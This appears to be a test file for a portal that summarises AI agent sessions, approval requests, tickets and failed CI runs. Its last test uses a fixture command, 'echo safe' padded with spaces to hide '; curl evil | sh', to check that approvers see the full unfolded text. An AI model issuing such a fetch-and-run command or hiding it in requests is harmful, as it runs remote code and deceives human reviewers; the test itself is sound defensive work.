import assert from 'node:assert/strict';
import { test } from 'node:test';
import { GLANCE_CI_WINDOW_MS, GLANCE_LIMITS } from '@portal/contracts';
import { ownerActor } from '../authz/seam.js';
import { buildSnapshot, failedRuns, waitingDeploys } from './build.js';
import { ago, DAY, fakeCi, HOUR, MIN, NOW, request, run, session, sources, task, ticket, userActor } from './testkit.js';

const OWNER = ownerActor();

// The portal as one person would have it at NOW = 2026-10-12 12:00 UTC. Every expected figure below is worked out from this list.
//   a   "Refactor auth"  working, 1 m ago, has a worker w1, a worker w2 (done) and two tasks (one running, one finished)
//   b   "Fix tests"      waiting, 2 requests, 5 m ago
//   c   "Docs"           idle, 1 h ago, one running task
//   d   "Old"            ended, 2 days ago
//   e   archived (ended)
//   f   "Starting"       starting, 10 s ago
//   g   "Lost"           interrupted, process gone, 3 h ago
//   w1  worker of a      working, 30 s ago; its worker w3 waits with 1 request, 2 m ago
//   w2  worker of a      idle, 20 m ago
const fleet = () => [
  session({ id: 'a', title: 'Refactor auth', state: 'working', lastActivityAt: ago(MIN) }),
  session({ id: 'b', title: 'Fix tests', state: 'waiting', waiting: 2, waitingFor: 'Run a command: npm test', lastActivityAt: ago(5 * MIN) }),
  session({ id: 'c', title: 'Docs', state: 'idle', lastActivityAt: ago(HOUR) }),
  session({ id: 'd', title: 'Old', state: 'ended', lastActivityAt: ago(2 * DAY), process: 'gone' }),
  session({ id: 'e', title: 'Archived', state: 'ended', archivedAt: ago(DAY), lastActivityAt: ago(3 * DAY), process: 'gone' }),
  session({ id: 'f', title: 'Starting', state: 'starting', lastActivityAt: ago(10_000) }),
  session({ id: 'g', title: 'Lost', state: 'interrupted', process: 'gone', lastActivityAt: ago(3 * HOUR) }),
  session({ id: 'w1', title: 'Worker one', state: 'working', parentId: 'a', lastActivityAt: ago(30_000) }),
  session({ id: 'w2', title: 'Worker two', state: 'idle', parentId: 'a', lastActivityAt: ago(20 * MIN) }),
  session({ id: 'w3', title: 'Worker three', state: 'waiting', waiting: 1, parentId: 'w1', lastActivityAt: ago(2 * MIN) }),
];
const requests = {
  b: [
    request({ requestId: 'r1', createdAt: ago(9 * MIN), title: 'Run a command', detail: 'npm test' }),
    request({ requestId: 'r2', createdAt: ago(4 * MIN), toolName: 'Edit', title: 'Edit a file', detail: 'src/a.ts', full: 'src/a.ts', agentLabel: 'toolu_01abc' }),
  ],
  w3: [request({ requestId: 'r3', createdAt: ago(6 * MIN), toolName: 'mcp__x__y', title: 'Use mcp__x__y', detail: null, full: '{\n  "a": 1\n}', agentLabel: 'Explore the auth module' })],
};
const tasks = {
  a: [task({ taskId: 't1', description: 'Map the auth module', subagentType: 'Explore', startedAt: ago(4 * MIN) }), task({ taskId: 't2', status: 'completed', startedAt: ago(30 * MIN) })],
  c: [task({ taskId: 't3', description: 'Docs sweep', startedAt: ago(2 * MIN) })],
};

test('sessions: running, waiting and open are counted over what is not archived or ended, and the list is by need then recency', () => {
  const snap = buildSnapshot(sources({ sessions: fleet(), requests, tasks }), OWNER, NOW);
  const s = snap.sessions;
  assert.equal(s.ok, true);
  // working: a, w1; starting: f
  assert.equal(s.running, 3);
  // waiting: b and w3
  assert.equal(s.waiting, 2);
  // not ended and not archived: a b c f g w1 w2 w3
  assert.equal(s.open, 8);
  // tier 0 waiting: w3 (2 m), b (5 m); tier 1 interrupted: g; tier 2 working or starting: f (10 s), w1 (30 s), a (1 m);
  // tier 3 idle: w2 (20 m), c (1 h); tier 4 ended: d (e is archived). Nine are listed, eight are carried.
  assert.deepEqual(s.items.map((x) => x.id), ['w3', 'b', 'g', 'f', 'w1', 'a', 'w2', 'c']);
  assert.equal(s.items.length, GLANCE_LIMITS.sessions);
  assert.equal(s.items[1]!.waitingFor, 'Run a command: npm test');
  assert.deepEqual([s.items[1]!.claudeId, s.items[1]!.claudeName], ['c1', 'Default']);
});

test('sessions for Home: interrupted counted; the recent list is pinned first (latest pin first), then the latest activity, without workers unless pinned; each row has its branch and the agents under it', () => {
  const rows = fleet().map((x) =>
    x.id === 'c' ? { ...x, pinnedAt: ago(DAY) } : x.id === 'w2' ? { ...x, pinnedAt: ago(HOUR) } : x.id === 'a' ? { ...x, worktree: { path: '/w/a', branch: 'feat/auth', repo: '/w', base: 'main' } as never } : x,
  );
  const s = buildSnapshot(sources({ sessions: rows, requests, tasks }), OWNER, NOW).sessions;
  // g is the one interrupted
  assert.equal(s.interrupted, 1);
  // open: a b c f g w1 w2 w3. Workers w1 (of a) and w3 (of w1) are left out; w2 is a worker but pinned. Pinned: w2 (1 h ago) then c (1 d ago);
  // then by activity: f (10 s), a (1 m), b (5 m), g (3 h). d is ended, e archived.
  assert.deepEqual(s.recent.map((x) => x.id), ['w2', 'c', 'f', 'a', 'b', 'g']);
  assert.deepEqual(s.recent.map((x) => x.pinned), [true, true, false, false, false, false]);
  const a = s.recent.find((x) => x.id === 'a')!;
  // a: task t1 running (t2 finished), worker w1 working (w2 idle does not count) = 2; c: task t3 = 1; b: nothing = 0
  assert.deepEqual([a.branch, a.agents], ['feat/auth', 2]);
  assert.equal(s.recent.find((x) => x.id === 'c')!.agents, 1);
  assert.equal(s.recent.find((x) => x.id === 'b')!.agents, 0);
  assert.equal(s.recent.find((x) => x.id === 'b')!.branch, null);
  // w1's worker w3 waits: it counts under w1 in the by-need list
  assert.equal(s.items.find((x) => x.id === 'w1')!.agents, 1);
  // the cap: 20 open sessions list 8 and the open count stays whole
  const many = Array.from({ length: 20 }, (_, i) => session({ id: `m${i}`, lastActivityAt: ago(i * MIN) }));
  const big = buildSnapshot(sources({ sessions: many }), OWNER, NOW).sessions;
  assert.equal(big.recent.length, GLANCE_LIMITS.recent);
  assert.equal(big.open, 20);
  assert.deepEqual(big.recent.slice(0, 2).map((x) => x.id), ['m0', 'm1']);
});

test('deploys: running runs holding a job for approval are listed and added to what needs attention', () => {
  const held = run({ id: 'D1', repoId: 'r1', pipeline: 'deploy', branch: 'main', status: 'running', created: 20 * MIN, jobs: [{ id: 'gate', status: 'passed' }, { id: 'release', status: 'waiting' }] });
  const busy = run({ id: 'D2', repoId: 'r1', pipeline: 'ci', branch: 'dev', status: 'running', created: 5 * MIN, jobs: [{ id: 'test', status: 'running' }] });
  const done = run({ id: 'D3', repoId: 'r1', pipeline: 'deploy', branch: 'main', status: 'passed', created: 2 * HOUR, finished: HOUR, jobs: [{ id: 'release', status: 'passed' }] });
  const found = waitingDeploys(fakeCi([held, busy, done]), 5);
  assert.deepEqual([found.count, found.items.map((r) => r.id)], [1, ['D1']]);
  const att = buildSnapshot(sources({ sessions: fleet(), requests, tasks, deploys: found }), OWNER, NOW).attention;
  assert.equal(att.deploys.count, 1);
  assert.deepEqual(att.deploys.items[0], { id: 'D1', number: 1, repo: 'r1', pipeline: 'deploy', job: 'release', branch: 'main', workspaceId: 'docker/dev', startedAt: ago(20 * MIN) });
  // 3 approvals + 1 deploy
  assert.equal(att.count, 4);
  const broken = buildSnapshot({ ...sources({ sessions: fleet(), requests, tasks }), deploys: () => { throw new Error('ci off'); } }, OWNER, NOW, () => undefined).attention;
  assert.deepEqual(broken.deploys, { ok: false, count: 0, items: [] });
  assert.equal(broken.count, 3);
});

test('agents: workers and running tasks under their parents, depth first; a finished worker and a finished task are left out', () => {
  const a = buildSnapshot(sources({ sessions: fleet(), requests, tasks }), OWNER, NOW).agents;
  assert.equal(a.ok, true);
  // roots by need: b, g, f, a, c. b, g and f have nothing running under them. a: its running task t1 (t2 finished), then its
  // workers by need: w1 (working, with w3 under it, waiting) and not w2 (idle, nothing under it). c: its running task t3.
  assert.deepEqual(
    a.rows.map((r) => [r.key, r.depth, r.kind, r.state]),
    [
      ['a', 0, 'session', 'working'],
      ['a/t1', 1, 'task', 'running'],
      ['w1', 1, 'worker', 'working'],
      ['w3', 2, 'worker', 'waiting'],
      ['c', 0, 'session', 'idle'],
      ['c/t3', 1, 'task', 'running'],
    ],
  );
  // what the chip counts: tasks t1 and t3, workers w1 (working) and w3 (waiting). The parents a and c are context, not agents.
  assert.equal(a.running, 4);
  assert.equal(a.waiting, 1);
  assert.equal(a.more, 0);
  // Stop: a working session's turn and a running task; not a waiting worker (answer it) and not an idle parent.
  assert.deepEqual(a.rows.filter((r) => r.stoppable).map((r) => r.key), ['a', 'a/t1', 'w1', 'c/t3']);
  assert.deepEqual(a.rows[1], { key: 'a/t1', depth: 1, kind: 'task', sessionId: 'a', taskId: 't1', title: 'Map the auth module', role: 'Explore', state: 'running', since: ago(4 * MIN), stoppable: true });
});

test('agents: a session that is not running has no tasks, a parent that is archived or ended makes its worker a root, nothing running reads as none', () => {
  const rows = [
    session({ id: 'p', state: 'ended', process: 'gone' }),
    session({ id: 'k', state: 'working', parentId: 'p', title: 'Orphan worker' }),
    session({ id: 'z', state: 'idle', process: 'asleep' }),
  ];
  // k's parent has ended: k is not a worker of anything shown, so it is a plain session with no tasks and no workers: not an agent.
  // z is asleep: its task rows (stale) are not read.
  const snap = buildSnapshot(sources({ sessions: rows, tasks: { z: [task({ taskId: 'zz' })], k: [] } }), OWNER, NOW);
  assert.deepEqual(snap.agents, { ok: true, running: 0, waiting: 0, rows: [], more: 0 });
});

test('agents: the list is capped and says how many more; a parent chain that loops is not drawn and does not hang', () => {
  const many = [session({ id: 'root', state: 'working' }), ...Array.from({ length: 20 }, (_, i) => session({ id: `k${i}`, state: 'working', parentId: 'root', lastActivityAt: ago(i * MIN) }))];
  const a = buildSnapshot(sources({ sessions: many }), OWNER, NOW).agents;
  // 21 rows (the root and 20 workers), 16 carried, all 20 workers counted.
  assert.equal(a.rows.length, GLANCE_LIMITS.agents);
  assert.equal(a.more, 5);
  assert.equal(a.running, 20);
  const loop = [session({ id: 'x', parentId: 'y', state: 'working' }), session({ id: 'y', parentId: 'x', state: 'working' })];
  assert.deepEqual(buildSnapshot(sources({ sessions: loop }), OWNER, NOW).agents.rows, []);
});

test('approvals: every open request of a session that is not ended or archived, the one waiting longest first, with its target as the session shows it', () => {
  const att = buildSnapshot(sources({ sessions: fleet(), requests, tasks }), OWNER, NOW).attention;
  const ap = att.approvals;
  assert.equal(ap.ok, true);
  assert.equal(ap.count, 3);
  // r1 9 m, r3 6 m, r2 4 m ago
  assert.deepEqual(ap.items.map((x) => x.requestId), ['r1', 'r3', 'r2']);
  assert.deepEqual(ap.items[0], {
    sessionId: 'b',
    sessionTitle: 'Fix tests',
    workspaceId: 'docker/dev',
    claudeId: 'c1',
    claudeName: 'Default',
    requestId: 'r1',
    kind: 'tool',
    toolName: 'Bash',
    title: 'Run a command',
    detail: 'npm test',
    full: 'npm test',
    fullCut: false,
    agentName: null,
    createdAt: ago(9 * MIN),
  });
  // a tool the portal has no one-line summary of has none (null) but shows its whole input, and a sub-agent is named by what it does, never by its call id
  assert.equal(ap.items[1]!.detail, null);
  assert.equal(ap.items[1]!.full, '{\n  "a": 1\n}');
  assert.equal(ap.items[1]!.agentName, 'Explore the auth module');
  assert.equal(ap.items[2]!.agentName, null, 'toolu_01abc is an id, not a name');
});

test('approvals: a request in an ended or archived session is not counted, and only the first few are listed', () => {
  const rows = [
    session({ id: 'live', state: 'waiting', waiting: 8 }),
    session({ id: 'gone', state: 'ended', waiting: 1, process: 'gone' }),
    session({ id: 'old', state: 'ended', waiting: 1, archivedAt: ago(DAY), process: 'gone' }),
  ];
  const reqs = {
    live: Array.from({ length: 8 }, (_, i) => request({ requestId: `q${i}`, createdAt: ago((20 - i) * MIN) })),
    gone: [request({ requestId: 'stale1' })],
    old: [request({ requestId: 'stale2' })],
  };
  const ap = buildSnapshot(sources({ sessions: rows, requests: reqs }), OWNER, NOW).attention.approvals;
  assert.equal(ap.count, 8);
  assert.equal(ap.items.length, GLANCE_LIMITS.approvals);
  assert.deepEqual(ap.items.map((x) => x.requestId), ['q0', 'q1', 'q2', 'q3', 'q4', 'q5']);
});

test('attention: the badge count is approvals, tickets waiting on a person and failed CI added up; long text is cut and folded', () => {
  const tickets = { count: 7, items: [ticket({ id: 'T-12', summary: `Ship it\n${'x'.repeat(300)}`, priority: 'urgent' }), ticket({ id: 'T-9' })] };
  const failed = {
    count: 2,
    items: [run({ id: 'run1', repoId: 'r1', pipeline: 'ci', branch: 'main', status: 'failed', created: HOUR, finished: HOUR / 2, subject: 'Fix\nthe thing' }), run({ id: 'run2', repoId: 'r1', pipeline: 'deploy', branch: null, status: 'failed', created: 2 * HOUR, finished: HOUR })],
  };
  const att = buildSnapshot(sources({ sessions: fleet(), requests, tasks, tickets, failed }), OWNER, NOW).attention;
  assert.equal(att.count, 3 + 7 + 2);
  assert.equal(att.tickets.count, 7, 'the whole count, though two are listed');
  assert.equal(att.tickets.items.length, 2);
  assert.equal(att.tickets.items[0]!.summary.length, 140);
  assert.ok(att.tickets.items[0]!.summary.endsWith('…'));
  assert.ok(!att.tickets.items[0]!.summary.includes('\n'));
  assert.equal(att.ci.count, 2);
  assert.equal(att.ci.items[0]!.subject, 'Fix the thing');
  assert.equal(att.ci.items[1]!.branch, null);
});

test('a source that cannot be read is unavailable, not zero, and the other blocks are unaffected', () => {
  const src = sources({ sessions: fleet(), requests, tasks, tickets: { count: 1, items: [ticket({ id: 'T-1' })] } });
  const logged: string[] = [];
  const broken = { ...src, tickets: () => { throw new Error('db locked'); }, failedRuns: () => { throw new Error('ci off'); } };
  const snap = buildSnapshot(broken, OWNER, NOW, (what) => logged.push(what));
  assert.deepEqual(snap.attention.tickets, { ok: false, count: 0, items: [] });
  assert.deepEqual(snap.attention.ci, { ok: false, count: 0, items: [] });
  assert.equal(snap.attention.approvals.count, 3, 'the approvals are still read');
  assert.equal(snap.attention.count, 3, 'and only what could be read is added up');
  assert.deepEqual(logged.sort(), ['ci', 'tickets']);

  const noSessions = buildSnapshot({ ...src, sessions: () => { throw new Error('boom'); } }, OWNER, NOW, () => undefined);
  assert.equal(noSessions.sessions.ok, false);
  assert.equal(noSessions.agents.ok, false);
  assert.equal(noSessions.attention.approvals.ok, false);
  assert.equal(noSessions.attention.tickets.ok, true);
  assert.equal(noSessions.at, new Date(NOW).toISOString());
});

// ---- failed CI ----
// The window is three days: since = NOW - 3 d. Runs (created = how long before NOW, finished = when it ended):
//   R1 r1/ci/main failed (finished 2 h ago)  then R2 r1/ci/main passed (created 1 h ago)   -> fixed, not listed
//   R3 r1/ci/feat failed (finished 5 h ago); R4 an older failure of the same branch (30 h) -> one problem, R3
//   R5 r2/deploy/main failed, finished 4 d ago                                              -> outside the window
//   R6 r2/ci/dev failed (finished 1 h ago), R7 a later run on dev that was cancelled        -> still failing, R6
//   R8 r3/ci/wip failed (finished 2 h ago), R9 a later run on wip that is running           -> running again, not listed
//   R10 r3/release tag v1 failed (finished 10 h ago)                                        -> a tag has no later run to ask: listed
const history = () => [
  run({ id: 'R1', repoId: 'r1', pipeline: 'ci', branch: 'main', status: 'failed', created: 3 * HOUR, finished: 2 * HOUR }),
  run({ id: 'R2', repoId: 'r1', pipeline: 'ci', branch: 'main', status: 'passed', created: HOUR, finished: HOUR - 10 * MIN }),
  run({ id: 'R3', repoId: 'r1', pipeline: 'ci', branch: 'feat', status: 'failed', created: 6 * HOUR, finished: 5 * HOUR }),
  run({ id: 'R4', repoId: 'r1', pipeline: 'ci', branch: 'feat', status: 'failed', created: 31 * HOUR, finished: 30 * HOUR }),
  run({ id: 'R5', repoId: 'r2', pipeline: 'deploy', branch: 'main', status: 'failed', created: 4 * DAY + HOUR, finished: 4 * DAY }),
  run({ id: 'R6', repoId: 'r2', pipeline: 'ci', branch: 'dev', status: 'failed', created: 2 * HOUR, finished: HOUR }),
  run({ id: 'R7', repoId: 'r2', pipeline: 'ci', branch: 'dev', status: 'cancelled', created: 30 * MIN, finished: 25 * MIN }),
  run({ id: 'R8', repoId: 'r3', pipeline: 'ci', branch: 'wip', status: 'failed', created: 3 * HOUR, finished: 2 * HOUR }),
  run({ id: 'R9', repoId: 'r3', pipeline: 'ci', branch: 'wip', status: 'running', created: HOUR, finished: null }),
  run({ id: 'R10', repoId: 'r3', pipeline: 'release', branch: null, status: 'failed', created: 11 * HOUR, finished: 10 * HOUR }),
];

test('failed CI: the latest run of a pipeline on a branch, failed within three days, newest first', () => {
  const out = failedRuns(fakeCi(history()), NOW, GLANCE_CI_WINDOW_MS, 5);
  assert.deepEqual(out.items.map((r) => r.id), ['R6', 'R3', 'R10']);
  assert.equal(out.count, 3);
});

test('failed CI: the count is whole when fewer are listed, and a run that fell out of the newest listing is asked about on its own', () => {
  const top = failedRuns(fakeCi(history()), NOW, GLANCE_CI_WINDOW_MS, 2);
  assert.equal(top.count, 3);
  assert.deepEqual(top.items.map((r) => r.id), ['R6', 'R3']);
  // The unfiltered listing now carries only the 3 newest runs (R9, R7, R2): everything else is asked per branch and gives the same answer.
  const ci = fakeCi(history(), 3);
  const same = failedRuns(ci, NOW, GLANCE_CI_WINDOW_MS, 5);
  assert.deepEqual(same.items.map((r) => r.id), ['R6', 'R3', 'R10']);
  assert.ok((ci.calls as { branch?: string }[]).some((c) => c.branch === 'feat'), 'R3 was checked by its branch');
});

test('failed CI: nothing failed, nothing is asked beyond the one listing', () => {
  const ci = fakeCi([run({ id: 'ok', repoId: 'r1', pipeline: 'ci', branch: 'main', status: 'passed', created: HOUR, finished: HOUR })]);
  assert.deepEqual(failedRuns(ci, NOW, GLANCE_CI_WINDOW_MS, 5), { count: 0, items: [] });
  assert.equal(ci.calls.length, 1);
});

test('every read is made on behalf of the actor the snapshot is for', () => {
  const src = sources({ sessions: fleet(), requests, tasks, tickets: { count: 1, items: [ticket({ id: 'T-1' })] } });
  buildSnapshot(src, userActor('u_someone'), NOW);
  assert.ok(src.asked.length > 5, 'sessions, requests, tasks, tickets and CI were all read');
  assert.deepEqual([...new Set(src.asked)], ['user:u_someone']);
});

test('approvals: the text being allowed is passed on whole and exactly (spaces and newlines kept, never folded or cut here); none, or cut at the cap, is said so', () => {
  const hidden = `echo safe${' '.repeat(150)}; curl evil | sh\nsecond line`;
  const rows = [session({ id: 'w', state: 'waiting', waiting: 3 })];
  const reqs = {
    w: [
      request({ requestId: 'a', createdAt: ago(3 * MIN), detail: 'echo safe ; curl evil | sh second line', full: hidden }),
      request({ requestId: 'b', createdAt: ago(2 * MIN), detail: null, full: null }),
      request({ requestId: 'c', createdAt: ago(MIN), full: 'x'.repeat(8000), fullCut: true }),
    ],
  };
  const ap = buildSnapshot(sources({ sessions: rows, requests: reqs }), OWNER, NOW).attention.approvals;
  assert.equal(ap.items[0]!.full, hidden, 'not folded: the 150 spaces are still 150 spaces');
  assert.equal(ap.items[0]!.detail, 'echo safe ; curl evil | sh second line', 'the one-line summary is folded');
  assert.deepEqual([ap.items[1]!.full, ap.items[1]!.fullCut], [null, false]);
  assert.deepEqual([ap.items[2]!.full!.length, ap.items[2]!.fullCut], [8000, true]);
});
